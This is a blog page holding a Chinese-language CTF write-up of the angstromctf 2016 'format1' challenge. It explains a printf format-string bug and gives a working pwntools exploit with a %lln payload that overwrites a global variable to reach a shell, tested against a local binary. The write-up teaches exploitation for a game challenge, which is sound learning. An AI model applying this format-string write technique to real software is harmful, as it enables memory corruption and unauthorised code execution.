@@ -1,0 +1,654 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="pwn,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mutou-jun's blog" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1">
+
+
+
+
+
+
+<meta name="description" content="64位elf程序，这个应该是个很基础的  格式化字符串程序，">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="angstromctf 2016-format1">
+<meta property="og:url" content="http://yoursite.com/2019/11/24/angstromctf 2016-format1/index.html">
+<meta property="og:site_name" content="mutou-jun&#39;s blog">
+<meta property="og:description" content="64位elf程序，这个应该是个很基础的  格式化字符串程序，">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/24/MOvMid.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/24/MOvQJA.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/24/MOvuIH.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/17/MsBbCQ.jpg">
+<meta property="og:updated_time" content="2019-11-24T12:48:06.767Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="angstromctf 2016-format1">
+<meta name="twitter:description" content="64位elf程序，这个应该是个很基础的  格式化字符串程序，">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/11/24/MOvMid.png">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Muse',
+    sidebar: {"position":"right","display":"always"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+  <title> angstromctf 2016-format1 | mutou-jun's blog </title>
+</head>
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">mutou-jun's blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                angstromctf 2016-format1
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2019-11-24T20:46:31+08:00" content="2019-11-24">
+              2019-11-24
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>64位elf程序，这个应该是个很基础的  格式化字符串程序，</p>
+<a id="more"></a>
+<h1 id="angstromctf-2016-format1"><a href="#angstromctf-2016-format1" class="headerlink" title="angstromctf 2016-format1"></a>angstromctf 2016-format1</h1><h2 id="查看程序属性和保护"><a href="#查看程序属性和保护" class="headerlink" title="查看程序属性和保护"></a>查看程序属性和保护</h2><blockquote>
+<p>file format1</p>
+</blockquote>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">format1:</span> <span class="string">ELF</span> <span class="number">64</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">executable,</span> <span class="string">x86-64,</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> <span class="string">interpreter</span> <span class="string">/lib64/l,</span> <span class="string">for</span> <span class="string">GNU/Linux</span> <span class="number">2.6</span><span class="number">.24</span><span class="string">,</span> <span class="string">BuildID[sha1]=81b6baaebe2601ee87fb569a4a23aaa00c67dd57,</span> <span class="string">not</span> <span class="string">stripped</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>checksec format1</p>
+</blockquote>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="string">Canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>简单运行下</p>
+</blockquote>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./format1 </span><br><span class="line">mutou</span><br><span class="line">mutou</span><br><span class="line">Sorry,<span class="built_in"> secret </span>= 0</span><br><span class="line"><span class="comment">#猜测  应该是将我们的输入原样输出，然后会一个判断，进而输出 "Sorry, secret = 0"</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="拖入ida："><a href="#拖入ida：" class="headerlink" title="拖入ida："></a>拖入ida：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  fgets(&amp;s, <span class="number">128</span>, _bss_start);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s, <span class="number">128L</span>L, argv);   <span class="comment">//利用格式化字符串漏洞 将其（secret）改成192  就好</span></span><br><span class="line">  <span class="keyword">if</span> ( secret == <span class="number">192</span> )          <span class="comment">//关键判断 需要将 变量 secret所在地址中的值 =192</span></span><br><span class="line">    give_shell();               <span class="comment">//只要执行了这个函数 就拿到 shellcode了</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Sorry, secret = %d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)secret);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
+<li>首先找 偏移</li>
+<li>然后将需要的地址找到     secret_addr</li>
+<li>构造payload      将  secret =192</li>
+</ol>
+<blockquote>
+<h3 id="找偏移：8"><a href="#找偏移：8" class="headerlink" title="找偏移：8"></a>找偏移：8</h3></blockquote>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaa%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span></span><br><span class="line">%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span></span><br><span class="line"></span><br><span class="line">aaaaaaaa0xd2105d<span class="built_in">..</span>0x7f8d7b31a790<span class="built_in">..</span>0xa2e2e70<span class="built_in">..</span>0xd2105d<span class="built_in">..</span>0x2e2e70252e2e7025<span class="built_in">..</span>0x7ffebead2648<span class="built_in">..</span>0x100000000<span class="built_in">..</span>0x6161616161616161<span class="built_in">..</span>0x2e2e70252e2e7025<span class="built_in">..</span>0x2e2e70252e2e7025<span class="built_in">..</span>0x2e2e70252e2e7025<span class="built_in">..</span>0x2e2e70252e2e7025<span class="built_in">..</span>0x2e2e70252e2e7025<span class="built_in">..</span>0x2e2e70252e2e7025<span class="built_in">..</span>0x2e2e70252e2e7025<span class="built_in">..</span>0x2e2e70252e2e7025<span class="built_in">..</span>0xa2e2e7025<span class="built_in">..</span></span><br><span class="line">Sorry,<span class="built_in"> secret </span>= 0      </span><br><span class="line"><span class="comment">#可以看到栈偏移为  8</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>secret_addr：000000000060107C （ida中双击secret即可找到）<br>因为是64位程序，我们将被更改的地址（secret）放在最后面，偏移加1：  </p>
+</blockquote>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">%192</span><span class="keyword">c</span><span class="symbol">%9</span>$lln\<span class="keyword">x</span><span class="number">7</span><span class="keyword">c</span>\<span class="keyword">x</span><span class="number">10</span>\<span class="keyword">x</span><span class="number">60</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>然而<br><img src="https://s2.ax1x.com/2019/11/24/MOvMid.png" alt="MOvMid.png"><br>所以我们再钱买你再补四个字符，导致偏移再次加 1   偏移为 10</p>
+</blockquote>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa<span class="symbol">%188</span><span class="keyword">c</span><span class="symbol">%10</span>$lln\<span class="keyword">x</span><span class="number">7</span><span class="keyword">c</span>\<span class="keyword">x</span><span class="number">10</span>\<span class="keyword">x</span><span class="number">60</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/11/24/MOvQJA.png" alt="MOvQJA.png"></p>
+<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level='debug'</span><br><span class="line">io = process('./format1')</span><br><span class="line"></span><br><span class="line">offset = 8</span><br><span class="line">secret_addr=0x000000000060107C</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"aaaa%188c%10$lln\x7c\x10\x60\x00\x00\x00\x00\x00"</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/11/24/MOvuIH.png" alt="MOvuIH.png"></p>
+<blockquote>
+<p>只有本地，成功打通！<br><img src="https://s2.ax1x.com/2019/11/17/MsBbCQ.jpg" alt="MsBbCQ.jpg"></p>
+</blockquote>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag">#pwn</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/24/MMA CTF 2nd 2016-greeting/" rel="next" title="MMA CTF 2nd 2016-greeting">
+                <i class="fa fa-chevron-left"></i> MMA CTF 2nd 2016-greeting
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="木头">
+          <p class="site-author-name" itemprop="name">木头</p>
+          <p class="site-description motion-element" itemprop="description">做个靠谱的人！</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">49</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+		  <br>
+		  <span id="busuanzi_container_site_uv">
+			<b><span id="busuanzi_value_site_uv"></span></b><br>
+			<span class="site-state-item-name">访客</span>
+			</span>
+
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=453175619&auto=0&height=32"></iframe>
+
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=805197&auto=1&height=32"></iframe>
+    
+		<br>
+		<div align="left" font-family: "arial","microsoft yahei","黑体","宋体",sans-serif>
+		<b><h1>个人简介</h1></b>
+		<p>姓名：木头<br>
+		性别：男<br>
+		QQ：1594783824<br>
+		爱好：书,球,歌<br>
+		主要奖项： xxx</p>
+		</div>
+		<br>
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#angstromctf-2016-format1"><span class="nav-number">1.</span> <span class="nav-text">angstromctf 2016-format1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看程序属性和保护"><span class="nav-number">1.1.</span> <span class="nav-text">查看程序属性和保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#拖入ida："><span class="nav-number">1.2.</span> <span class="nav-text">拖入ida：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#思路"><span class="nav-number">1.3.</span> <span class="nav-text">思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#找偏移：8"><span class="nav-number">1.3.1.</span> <span class="nav-text">找偏移：8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp："><span class="nav-number">1.3.2.</span> <span class="nav-text">exp：</span></a></li></ol></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">木头</span>
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+  
+  
+  
+
+  
+
+  
+
+</body>
+</html>
